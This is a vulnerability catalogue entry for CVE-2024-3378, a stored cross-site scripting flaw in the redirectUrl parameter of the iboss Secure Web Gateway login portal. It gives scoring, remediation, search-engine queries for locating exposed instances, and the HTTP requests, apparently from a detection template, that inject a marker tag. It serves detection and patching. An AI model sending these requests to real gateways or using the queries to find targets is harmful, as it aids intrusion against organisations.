---
layout: post
cve_id: CVE-2024-3378
title: iboss Secure Web Gateway - Stored Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2024/CVE-2024-3378.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-3378.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: medium
impact: 'Attackers can inject malicious scripts via the redirectUrl parameter in the
  login portal.

  '
remediation: 'Update iboss Secure Web Gateway to version 10.2.0.160 or later.

  '
reference:
- https://www.exploit-db.com/exploits/52009
- https://github.com/modrnProph3t/CVE/blob/main/CVE-2024-3378.md
- https://vuldb.com/?ctiid.259501
- https://vuldb.com/?id.259501
- https://vuldb.com/?submit.310642
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
  cvss-score: 4.3
  cve-id: CVE-2024-3378
  cwe-id: CWE-79
  epss-score: 0.03566
  epss-percentile: 0.87366
  cpe: cpe:2.3:a:iboss:secure_web_gateway:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: iboss
  product: secure_web_gateway
  shodan-query: html:"iboss-font.css"
  fofa-query: body="iboss-font.css"
  google-query: intext:"iboss-font.css"
tags:
- cve
- cve2024
- iboss
- xss
- intrusive
- vkev
- vuln
---

## üîç Vulnerability Description
A cross-site scripting vulnerability has been found in iboss Secure Web Gateway up to version 10.1. The vulnerability affects the /login file of the Login Portal component, where manipulation of the redirectUrl parameter leads to cross-site scripting. The attack can be launched remotely and the exploit has been disclosed to the public.


## üåê HTTP Request
```nohighlight
POST /user_login_submit HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WOW64; rv:41.0) Gecko/20100101 Firefox/140.0.1 (x64 de)
Connection: close
Content-Length: 88
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

userName=u0tF9WVZVK&x=JbI2LsXE1v&action=login&redirectUrl=</38EmBJDx0bvGwIrb5turxz6mA4O>
```

```nohighlight
GET /login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
Connection: close
Accept-Encoding: gzip
```

